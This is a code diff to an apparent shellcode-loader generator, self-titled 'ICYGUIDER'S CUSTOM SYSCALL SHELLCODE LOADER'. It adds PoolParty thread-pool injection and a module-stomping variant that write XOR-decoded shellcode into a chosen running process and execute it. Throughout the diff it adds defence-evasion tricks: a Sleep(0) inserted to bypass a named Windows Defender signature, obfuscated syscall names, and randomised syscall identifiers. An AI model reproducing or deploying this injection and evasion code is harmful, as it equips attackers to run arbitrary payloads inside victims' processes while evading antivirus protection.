@@ -90,6 +90,7 @@ int deC(unsigned char payload[])
     key = skCrypt("REPLACE_ME_KEY");
     for (int i = 0; i < payload_len; i++)
     {
+        Sleep(0); // Bypass WD "Trojan:Win64/ShellcodeRunner.AMMA!MTB" signature
         decoded[i] = payload[i] ^ (int)key[i % key.length()];
     }
     key.clear();
@@ -181,6 +182,7 @@ using myNtSetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT Cont
 using myNtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
 using myNtOpenSection = NTSTATUS(NTAPI*)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
 using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+using myNtFreeVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
 
 myNtAllocateVirtualMemory NtAllocateVirtualMemory;
 myNtWriteVirtualMemory NtWriteVirtualMemory;
@@ -199,6 +201,7 @@ myNtSetContextThread NtSetContextThread;
 myNtDelayExecution NtDelayExecution;
 myNtOpenSection NtOpenSection;
 myNtMapViewOfSection NtMapViewOfSection;
+myNtFreeVirtualMemory NtFreeVirtualMemory;
 
 PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
 {
@@ -249,8 +252,8 @@ GetSyscallStubP2 = """
     HANDLE syscallStub_NtDelayExecution = static_cast<char*>(syscallStub_NtSetContextThread) + SYSCALL_STUB_SIZE;
     HANDLE syscallStub_NtOpenSection = static_cast<char*>(syscallStub_NtDelayExecution) + SYSCALL_STUB_SIZE;
     HANDLE syscallStub_NtMapViewOfSection = static_cast<char*>(syscallStub_NtOpenSection) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtFreeVirtualMemory = static_cast<char*>(syscallStub_NtMapViewOfSection) + SYSCALL_STUB_SIZE;
 
-    char syscallStub[SYSCALL_STUB_SIZE] = {};
     DWORD oldProtection = 0;
     HANDLE file = NULL;
     DWORD fileSize = NULL;
@@ -324,6 +327,10 @@ GetSyscallStubP2 = """
     // define NtMapViewOfSection
     NtMapViewOfSection = (myNtMapViewOfSection)syscallStub_NtMapViewOfSection;
     VirtualProtect(syscallStub_NtMapViewOfSection, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtFreeVirtualMemory
+    NtFreeVirtualMemory = (myNtFreeVirtualMemory)syscallStub_NtFreeVirtualMemory;
+    VirtualProtect(syscallStub_NtFreeVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 
     file = CreateFileA("c:\\\\windows\\\\system32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -400,6 +407,9 @@ GetSyscallStubP2 = """
     scall = std::string("N") + "t" + "M" + "a" + "p" + "V" + "i" + "e" + "w" + "O" + "f" + "S" + "e" + "c" + "t" + "i" + "o" + "n";
     StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtMapViewOfSection);
     printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "F" + "r" + "e" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtFreeVirtualMemory);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
 """
 
 NoSyscall_StubP1 = """
@@ -445,6 +455,7 @@ using myNtSetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT Cont
 using myNtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
 using myNtOpenSection = NTSTATUS(NTAPI*)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
 using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+using myNtFreeVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
 
 // Get API functions required to unhook.
 char Nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };
@@ -469,6 +480,7 @@ myNtAlertResumeThread NtAlertResumeThread;
 myNtGetContextThread NtGetContextThread;
 myNtSetContextThread NtSetContextThread;
 myNtDelayExecution NtDelayExecution;
+myNtFreeVirtualMemory NtFreeVirtualMemory;
 """
 
 NoSyscall_StubP2 = """
@@ -503,6 +515,8 @@ NoSyscall_StubP2 = """
     NtSetContextThread = (myNtSetContextThread)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
     scall = std::string("N") + "t" + "D" + "e" + "l" + "a" + "y" + "E" + "x" + "e" + "c" + "u" + "t" + "i" + "o" + "n";
     NtDelayExecution = (myNtDelayExecution)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
+    scall = std::string("N") + "t" + "F" + "r" + "e" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
+    NtFreeVirtualMemory = (myNtFreeVirtualMemory)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
 """
 
 sleep_check = """
@@ -1919,6 +1933,332 @@ RemoteThreadContext_stub = """
     NewNtClose(hThread);
 """
 
+poolparty_varient7_functions = """
+// POOL PARTY FUNCTIONS
+#include "PoolParty.h"
+
+HANDLE m_p_hIoCompletion = NULL;
+//REPLACE_SHIM_DEFINITION
+//REPLACE_SHIM_XOR_DECODER
+
+HANDLE HijackIoCompletionProcessHandle(HANDLE processHandle) {
+    return HijackProcessHandle((PWSTR)L"IoCompletion\\0", processHandle, IO_COMPLETION_ALL_ACCESS);
+}
+
+HANDLE GetTargetThreadPoolIoCompletionHandle(HANDLE processHandle) {
+    HANDLE p_hIoCompletion = HijackIoCompletionProcessHandle(processHandle);
+    auto eString = skCrypt("[INFO]  Hijacked I/O completion handle from the target process: ");
+    printf("%s%x\\n", eString.decrypt(), p_hIoCompletion);
+    eString.clear();
+    return p_hIoCompletion;
+}
+
+void RemoteTpDirectInsertionSetupExecution(HANDLE processHandle, LPVOID buffer) {
+    _ZwSetIoCompletion ZwSetIoCompletion = (_ZwSetIoCompletion)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSetIoCompletion"));
+    TP_DIRECT Direct = { 0 };
+    Direct.Callback = buffer;
+    safe_print(skCrypt("[INFO]  Crafted TP_DIRECT structure associated with the shellcode"));
+
+    PTP_DIRECT RemoteDirectAddress = (PTP_DIRECT)(VirtualAllocEx(processHandle, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    auto eString2 = skCrypt("[INFO]  Allocated TP_DIRECT memory in the target process: ");
+    printf("%s%p\\n", eString2.decrypt(), RemoteDirectAddress);
+    eString2.clear();
+    NTSTATUS res = NtWriteVirtualMemory(processHandle, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL);
+    safe_print(skCrypt("[INFO]  Written the TP_DIRECT structure to the target process"));
+
+    ZwSetIoCompletion(m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
+    safe_print(skCrypt("[INFO]  Queued a packet to the IO completion port of the target process worker factory"));
+}
+
+void HijackHandles(HANDLE processHandle) {
+    m_p_hIoCompletion = GetTargetThreadPoolIoCompletionHandle(processHandle);
+}
+"""
+
+poolparty_varient7_stub = """
+    REPLACE_ME_SLEEP_CALL
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
+    //REPLACE_ME_SANDBOX_CALL
+    REPLACE_ME_CALL_UNHOOK
+    REPLACE_ME_SYSCALL_STUB_P2
+    deC(REPLACE_ME_DECARG);
+
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    DWORD pid = 0;
+    auto processName = skCrypt("REPLACE_ME_PROCESS");
+    if (Process32First(snapshot, &entry) == TRUE)
+    {
+        while (Process32Next(snapshot, &entry) == TRUE)
+        {
+            if (stricmp(entry.szExeFile, processName) == 0)
+            {  
+                pid = entry.th32ProcessID;
+                auto eString = skCrypt("PID found for ");
+                printf("%s%s: %d\\n", eString.decrypt(), processName, pid);
+                eString.clear();
+                break;
+            }
+        }
+    }
+    CloseHandle(snapshot);
+    if (pid == 0) {
+        auto eString2 = skCrypt("Are you sure the target process is running?\\nFailed to find PID for ");
+        printf("%s%s", eString2.decrypt(), processName);
+        eString2.clear();
+        return 1;
+    }
+
+    // open handle to target process
+    HANDLE processHandle = NULL;
+    CLIENT_ID cID;
+    cID.UniqueThread = 0;
+    cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
+    NtOpenProcess(&processHandle, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &oa, &cID);
+
+    LPVOID base_addr = NULL;
+    NTSTATUS res;
+    ULONG oldProtect = 0;
+    SIZE_T shellcodeLen = payload_len;
+
+    // allocate memory in remote process for shellcode
+    res = NtAllocateVirtualMemory(processHandle, &base_addr, 0, &shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    auto eString3 = skCrypt("NtAllocateVirtualMemory res (base_addr): 0x");
+    printf("%s%x\\n", eString3.decrypt(), res);
+    eString3.clear();
+    //printf("NtAllocateVirtualMemory res (base_addr): 0x%x\\n", res);
+    auto eString4 = skCrypt("base_addr:   ");
+    printf("%s%#p\\n", eString4.decrypt(), base_addr);
+    eString4.clear();
+    //printf("base_addr:   %#p\\n", base_addr);
+
+    // write shellcode to allocated memory
+    SIZE_T bytesWritten;
+    res = NtWriteVirtualMemory(processHandle, base_addr, decoded, shellcodeLen, &bytesWritten);
+    auto eString5 = skCrypt("NtWriteVirtualMemory res (base_addr): 0x");
+    printf("%s%x\\n", eString5.decrypt(), res);
+    eString5.clear();
+    //printf("NtWriteVirtualMemory res (base_addr): 0x%x\\n", res);
+
+    //Flip RW bit to RX for shellcode execution
+    res = NtProtectVirtualMemory(processHandle, &base_addr, &shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
+    auto eString6 = skCrypt("NtProtectVirtualMemory res (base_addr): 0x");
+    printf("%s%x\\n", eString6.decrypt(), res);
+    eString6.clear();
+    //printf("NtProtectVirtualMemory res (base_addr): 0x%x\\n", res);
+
+    // execute shim via poolparty
+    HijackHandles(processHandle);
+    RemoteTpDirectInsertionSetupExecution(processHandle, base_addr);
+
+    NewNtClose(processHandle);
+"""
+
+pool_party_module_stomping_shim_xor_decoder = """
+int decodeShim(unsigned char encodedShim[], SIZE_T size)
+{
+    std::string key;
+    key = skCrypt("REPLACE_ME_KEY");
+    for (int i = 0; i < size; i++)
+    {
+        Sleep(0); // Bypass WD "Trojan:Win64/ShellcodeRunner.AMMA!MTB" signature
+        decodedShim[i] = encodedShim[i] ^ (int)key[i % key.length()];
+    }
+    key.clear();
+    return 0;
+}
+"""
+
+poolparty_modulestomping_stub = """
+    REPLACE_ME_SLEEP_CALL
+    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
+    //REPLACE_ME_SANDBOX_CALL
+    REPLACE_ME_CALL_UNHOOK
+    REPLACE_ME_SYSCALL_STUB_P2
+    deC(REPLACE_ME_DECARG);
+
+    SIZE_T shimSize = 560;
+    SIZE_T shellcodeLen = payload_len;
+
+    // This will xor decode a shim to load mstscax.dll into the remote process
+    decodeShim(shim, shimSize);
+
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    DWORD pid = 0;
+    auto processName = skCrypt("REPLACE_ME_PROCESS");
+    if (Process32First(snapshot, &entry) == TRUE)
+    {
+        while (Process32Next(snapshot, &entry) == TRUE)
+        {
+            if (stricmp(entry.szExeFile, processName) == 0)
+            {  
+                pid = entry.th32ProcessID;
+                auto eString = skCrypt("PID found for ");
+                printf("%s%s: %d\\n", eString.decrypt(), processName, pid);
+                eString.clear();
+                break;
+            }
+        }
+    }
+    CloseHandle(snapshot);
+    if (pid == 0) {
+        auto eString2 = skCrypt("Are you sure the target process is running?\\nFailed to find PID for ");
+        printf("%s%s", eString2.decrypt(), processName);
+        eString2.clear();
+        return 1;
+    }
+
+    // open handle to target process
+    HANDLE processHandle = NULL;
+    CLIENT_ID cID;
+    cID.UniqueThread = 0;
+    cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
+    NtOpenProcess(&processHandle, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &oa, &cID);
+
+    auto moduleToInject = skCrypt("mstscax.dll");
+    auto moduleFunction = skCrypt("DllCanUnloadNow");
+    NTSTATUS res;
+
+    LPVOID allocModule = NULL;
+    LPVOID allocShim = NULL;
+    SIZE_T bytesWritten;
+    ULONG oldProtect = 0;
+    SIZE_T moduleSize = sizeof(moduleToInject) + 2;
+
+    // allocate memory in remote process for shim
+    res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    auto eString3 = skCrypt("NtAllocateVirtualMemory res (allocShim): 0x");
+    printf("%s%x\\n", eString3.decrypt(), res);
+    eString3.clear();
+    //printf("NtAllocateVirtualMemory res (allocShim): 0x%x\\n", res);
+    auto eString4 = skCrypt("allocShim:   ");
+    printf("%s%#p\\n", eString4.decrypt(), allocShim);
+    eString4.clear();
+    //printf("allocShim:   %#p\\n", allocShim);
+
+    // write shim to allocated memory
+    res = NtWriteVirtualMemory(processHandle, allocShim, decodedShim, shimSize, &bytesWritten);
+    auto eString5 = skCrypt("NtWriteVirtualMemory res (Shim): 0x");
+    printf("%s%x\\n", eString5.decrypt(), res);
+    eString5.clear();
+    //printf("NtWriteVirtualMemory res (Shim): 0x%x\\n", res);
+
+    //Flip RW bit to RX for shim execution
+    res = NtProtectVirtualMemory(processHandle, &allocShim, &shimSize, PAGE_EXECUTE_READ, &oldProtect);
+    auto eString6 = skCrypt("NtProtectVirtualMemory res (Shim): 0x");
+    printf("%s%x\\n", eString6.decrypt(), res);
+    eString6.clear();
+    //printf("NtProtectVirtualMemory res (Shim): 0x%x\\n", res);
+
+    // execute shim via poolparty
+    HijackHandles(processHandle);
+    RemoteTpDirectInsertionSetupExecution(processHandle, allocShim);
+    
+    // cleanup shim
+    Sleep(2000);
+    res = NtFreeVirtualMemory(processHandle, &allocShim, &shimSize, MEM_RELEASE);
+    auto eString7 = skCrypt("NtFreeVirtualMemory res (allocShim): 0x");
+    printf("%s%x\\n", eString7.decrypt(), res);
+    eString7.clear();
+    //printf("NtFreeVirtualMemory res (allocShim): 0x%x\\n", res);
+
+    // get address of module function
+    HMODULE xps = LoadLibraryExA(moduleToInject, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    LPVOID funcAddress = (LPVOID)GetProcAddress(xps, moduleFunction);
+    auto eString8 = skCrypt("funcAddress: ");
+    printf("%s%#p\\n", eString8.decrypt(), funcAddress);
+    eString8.clear();
+    //printf("funcAddress: %#p\\n", funcAddress);
+
+    // get offset of module function
+    PVOID f2 = (PVOID)funcAddress;
+    long funcOffset = (uintptr_t)f2 - (uintptr_t)xps;
+    auto eString9 = skCrypt("funcOffset: ");
+    printf("%s%#p\\n", eString9.decrypt(), funcOffset);
+    eString9.clear();
+    //printf("funcOffset: %#p\\n", funcOffset);
+
+    // get base address of loaded dll in remote process
+    HMODULE hMods[1024];
+    DWORD cbNeeded;
+    LPVOID moduleBaseAddr;
+    if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
+    {
+        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
+        {
+            TCHAR szModName[MAX_PATH];
+            // Get the full path to the module's file.
+            if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
+            {
+                std::string dang = szModName;
+                if (dang.find(moduleToInject) != std::string::npos)
+                {
+                    _tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
+                    moduleBaseAddr = hMods[i];
+                    //printf("szModName: %s\\n", szModName);
+                    auto eString10 = skCrypt("Baseaddr: ");
+                    printf("%s%#p\\n", eString10.decrypt(), hMods[i]);
+                    eString10.clear();
+                    //printf("Baseaddr: %#p\\n", hMods[i]);
+                }
+            }
+        }
+    }
+
+    // calculate function address in module from offset
+    LPVOID remoteFuncAddress = (LPVOID)((uintptr_t)moduleBaseAddr + (uintptr_t)funcOffset);
+    auto eString11 = skCrypt("remoteFuncAddress: ");
+    printf("%s%#p\\n", eString11.decrypt(), remoteFuncAddress);
+    eString11.clear();
+    //printf("remoteFuncAddress: %#p\\n", remoteFuncAddress);
+
+    // fix offset address
+    uintptr_t jankOffset = (uintptr_t)remoteFuncAddress % (0x1000);
+    auto eString12 = skCrypt("jankOffset: ");
+    printf("%s%#p\\n", eString12.decrypt(), jankOffset);
+    eString12.clear();
+    //printf("jankOffset: %#p\\n", jankOffset);
+
+    // set vars for shellcode writing
+    SIZE_T bytesWritten2;
+
+    // Set RW bit on module function address 
+    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, PAGE_READWRITE, &oldProtect);
+    auto eString13 = skCrypt("NtProtectVirtualMemory res (shellcode): 0x");
+    printf("%s%x\\n", eString13.decrypt(), res);
+    eString13.clear();
+    //printf("NtProtectVirtualMemory res (shellcode): 0x%x\\n", res);
+
+    // Write shellcode to correct module function address 
+    res = NtWriteVirtualMemory(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + jankOffset), decoded, shellcodeLen, &bytesWritten2);
+    auto eString14 = skCrypt("NtWriteVirtualMemory res (shellcode): 0x");
+    printf("%s%x\\n", eString14.decrypt(), res);
+    eString14.clear();
+    //printf("NtWriteVirtualMemory res (shellcode): 0x%x\\n", res);
+
+    // Flip RW bit to RX
+    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
+    auto eString15 = skCrypt("NtProtectVirtualMemory res (shellcode): 0x");
+    printf("%s%x\\n", eString15.decrypt(), res);
+    eString15.clear();
+    //printf("NtProtectVirtualMemory res (shellcode): 0x%x\\n", res);
+
+    // Execute shellcode via PoolParty varient 7
+    HijackHandles(processHandle);
+    RemoteTpDirectInsertionSetupExecution(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + jankOffset));
+
+    NewNtClose(processHandle);
+"""
+
 invoke_sandbox_check = """
     CheckSandbox();
 
@@ -1926,7 +2266,9 @@ invoke_sandbox_check = """
 """
 
 rundll_stub = """
-BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+#define DLLEXPORT   __declspec( dllexport )
+
+__declspec(dllexport)BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
     //HANDLE threadhandle;
     switch(dwReason){
         case DLL_PROCESS_ATTACH:
@@ -2068,6 +2410,24 @@ def generateRandomSyscall(length):
     letters = string.ascii_letters
     syscall = ''.join(random.choice(letters) for i in range(length))
     return syscall
+
+def xorShimEncode(infile, key):
+    # Generate key if one is not supplied
+    if key == "" or key == None:
+        letters = string.ascii_letters + string.digits
+        key = ''.join(random.choice(letters) for i in range(49))
+    # read input file as raw bytes
+    file = open(infile, 'rb')
+    contents = file.read()
+    file.close()
+    # initialize encrypted byte array, starting with marker
+    encoded = []
+    hex_formated = []
+    for b in range(len(contents)):
+        test = contents[b] ^ ord(key[b % len(key)])
+        hex_formated.append("{:02x}".format(test)) # store as each byte as hex string in array
+        encoded.append(test)
+    return '0x' + ', 0x'.join(hex_formated)
 
 
 def main(stub, infile, outfile, key, process, method, no_randomize, verbose, sandbox, no_sandbox, obfuscator_LLVM, word_encode, dll, sandbox_arg, no_ppid_spoof, dll_proxy, unhook, syscall_arg, create_process, target_dll, export_function, ppid_process, ppid_priv):
@@ -2219,6 +2579,26 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_EXPORT_FUNCTION", str(list(export_function))[1:-1])
         print(f"[+] Writing to {export_function} export function in {target_dll}")
         print("[+] Using {} for ThreadlessInject".format(process))
+    if method == "poolparty":
+        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
+        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
+        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", poolparty_varient7_functions)
+        stub = stub.replace("REPLACE_STUB_METHOD", poolparty_varient7_stub)
+        print("[+] Targeting existing {} process for PoolParty injection".format(process))
+        stub = stub.replace("CREATE_SUSPENDED | ", "")
+        stub = stub.replace("REPLACE_ME_PROCESS", process)
+    if method == "poolpartymodulestomping":
+        encoded_shim = xorShimEncode("mstscax_shim.bin", key)
+        stub = stub.replace("REPLACE_THREADLESS_FUNCTIONS", "")
+        stub = stub.replace("REPLACE_THREADLESS_DEFINITIONS", "")
+        new_poolparty_functions = poolparty_varient7_functions.replace("//REPLACE_SHIM_XOR_DECODER", pool_party_module_stomping_shim_xor_decoder)
+        new_poolparty_functions = new_poolparty_functions.replace("//REPLACE_SHIM_DEFINITION", f"unsigned char shim[] = {{{encoded_shim}}} ;\nunsigned char* decodedShim = (unsigned char*)malloc(560);")
+        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", new_poolparty_functions)
+        stub = stub.replace("REPLACE_STUB_METHOD", poolparty_modulestomping_stub)
+        print("[+] Targeting existing {} process for PoolPartyModuleStomping injection".format(process))
+        stub = stub.replace("CREATE_SUSPENDED | ", "")
+        stub = stub.replace("REPLACE_ME_PROCESS", process)
+        stub = stub.replace("REPLACE_ME_KEY", key)
 
     if word_encode == False:
         stub = stub.replace("REPLACE_ME_DECARG", "payload")
@@ -2277,7 +2657,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         replace_seed(old_seed, new_seed, syscall_arg)
         replace_syscall_hashes(new_seed, syscall_arg)
 
-    if no_ppid_spoof == True:
+    if no_ppid_spoof == True or "poolparty" in method:
         print("[+] PPID Spoofing has been disabled")
         stub = stub.replace("REPLACE_PPID_SPOOF", "")
         stub = stub.replace("REPLACE_GET_PROC_TOKEN_FUNCTION", get_proc_session_ID)
@@ -2353,7 +2733,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
     if no_randomize != True:
         print("[+] Randomizing syscall names")
         name_len = 19
-        syscalls = ["NtOpenSection", "NtMapViewOfSection", "NewNtWaitForSingleObject", "NewNtQueryInformationProcess", "NewNtClose", "NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread", "NtDelayExecution"]
+        syscalls = ["NtFreeVirtualMemory", "NtOpenSection", "NtMapViewOfSection", "NewNtWaitForSingleObject", "NewNtQueryInformationProcess", "NewNtClose", "NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread", "NtDelayExecution"]
         for syscall in syscalls:
             random_syscall = generateRandomSyscall(name_len)
             syscall_contents = syscall_contents.replace(syscall, random_syscall)
@@ -2409,7 +2789,7 @@ print(inspiration[1:-1])
 parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSCALL SHELLCODE LOADER')
 parser.add_argument("file", help="File containing raw shellcode", type=str)
 parser.add_argument('-p', '--process', dest='process', help='Process to inject into (Default: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
-parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: ThreadlessInject, ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
+parser.add_argument('-m', '--method', dest='method', help='Method for shellcode execution (Options: PoolPartyModuleStomping, PoolParty, ThreadlessInject, ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (Default: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
 parser.add_argument('-u', '--unhook', action='store_true', help='Unhook NTDLL in current process')
 parser.add_argument('-w', '--word-encode', action='store_true', help='Save shellcode in stub as array of English words')
 parser.add_argument('-nr', '--no-randomize', action='store_true', help='Disable syscall name randomization')
@@ -2455,14 +2835,15 @@ try:
             sys.exit()
     method = args.method.lower()
     syscall_arg = args.syscall_arg.lower()
-    if method != "threadlessinject" and method != "queueuserapc" and method != "modulestomping" and method != "functionstomping" and method != "processhollow" and method != "enumdisplaymonitors" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread":
+    if method != "poolpartymodulestomping" and method != "threadlessinject" and method != "queueuserapc" and method != "modulestomping" and method != "functionstomping" and method != "processhollow" and method != "enumdisplaymonitors" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread" and method != "poolparty":
         print("[!] Invalid shellcode execution method provided!")
-        print("[+] Valid shellcode execution methods are: ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
+        print("[+] Valid shellcode execution methods are: PoolPartyModuleStomping, PoolParty, ThreadlessInject, ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
         sys.exit()
-    if args.process == "msedge.exe":
-        args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
-    elif args.process == "iexplore.exe":
-        args.process = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"
+    if method != "poolparty" and method != "poolpartymodulestomping":
+        if args.process == "msedge.exe":
+            args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
+        elif args.process == "iexplore.exe":
+            args.process = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"
     key = generateKey(49)
     main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, sandbox, args.no_sandbox, args.llvm_obfuscator, args.word_encode, args.dll, args.sandbox_arg, args.no_ppid_spoof, args.dll_proxy, args.unhook, syscall_arg, args.create_process, args.target_dll, args.export_function, args.ppid, args.ppid_priv)
 except:
